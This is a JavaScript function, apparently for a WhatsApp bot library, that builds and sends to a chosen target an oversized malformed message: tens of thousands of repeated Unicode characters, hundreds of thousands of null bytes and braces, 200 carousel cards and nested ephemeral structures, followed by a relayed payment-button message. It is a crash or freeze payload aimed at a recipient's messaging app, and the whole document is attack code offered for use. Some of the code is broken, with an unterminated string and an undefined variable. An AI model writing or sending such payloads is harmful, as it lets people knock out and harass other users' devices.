async function ForceNewRapzz(target, mentionedList = []) {
    const client = this; 
    
    const message = {
        botInvokeMessage: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: '666@newsletter',
                    newsletterName: "ꦾ".repeat(60000),
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiMicoH/2gAMAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                    caption: "ꦾ".repeat(90000),
                    inviteExpiration: Date.now() + 0x99999999999abcdef,
                },
            },
        },
        nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: [
                {
                    name: "mpm",
                    buttonParamsJson: "\u0000".repeat(808808)
                },
                {
                    name: "single_select",
                    buttonParamsJson: "{\"title\":\"" + "ྀ".repeat(77777) + "ྀ".repeat(77777) + "\",\"sections\":[{\"title\":\"" + "ྀ".repeat(77777) + "\",\"rows\":[]}]}"
                },
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({ status: "1" })
                },
                {
                    name: "call_permission_request",
                    buttonParamsJson: "{".repeat(808808)
                }
            ]
        },
        nativeFlowInfo: {
            name: "galaxy_message",
            paramsJson: "\u0003".repeat(9999)
        },
        carouselMessage: {
            cards: Array.from({ length: 200 }, () => ({
                cardHeader: {
                    title: "\u0000".repeat(999),
                    subtitle: "𝐑𝐚𝐩𝐳𝐳𝐳𝐅𝐮𝐜𝐤𝐖𝐨𝐫𝐥𝐝𝐝 ( 𝐂𝐨𝐫𝐞𝟗𝟗𝟗 )",
                    thumbnail: Buffer.alloc(1024 * 32).fill(0)
                },
                cardContent: {
                    title: "\u0000",
                    description: "\n".repeat(500)
                },
                buttons: [
                    { name: "call_permission_request", buttonParamsJson: "\u0000" + Rapzfvckworld  },
                    { name: "mpm", buttonParamsJson: "{".repeat(1000) + Rapzfvckworld  },
                    { name: "single_select", buttonParamsJson: "" }
                ]
            }))
        },
        contextInfo: {
            remoteJid: target,
            participant: target,
            mentionedJid: mentionedList,
            stanzaId: client.generateMessageTag(),
            businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
            },
            expiration: 9741,
            ephemeralSettingTimestamp: 9741,
            entryPointConversionSource: "WhatsApp.com",
            entryPointConversionApp: "WhatsApp",
            entryPointConversionDelaySeconds: 9742,
            disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
            },
            quotedMessage: {
                ephemeralMessage: {
                    message: {
                        viewOnceMessage: {
                            message: {
                                ephemeralSettingRequestMessage: {
                                    ephemeralDuration: 0
                                },
                                orderMessage: {
                                    itemCount: 99999999
                                }
                            }
                        }
                    }
                }
            }
        },
    };

    await client.sendMessage(target, message);

    await client.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: '𝐑𝐚𝐩𝐳𝐳𝐳𝐅𝐮𝐜𝐤𝐖𝐨𝐫𝐥𝐝𝐝 ꦾ '
            },
            header: {
                hasMediaAttachment: true,
                jpegThumbnail:  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiMicoH/2gAMAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=, 
                contextInfo: {
                    participant: target
                }
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "payment_method",
                        buttonParamsJson: "{}"
                    }
                ]
            }
        }
    }, {
        participant: { jid: target },
        additionalNodes: [
            {
                tag: 'biz',
                attrs: { native_flow_name: 'payment_method' }
            }
        ]
    });
}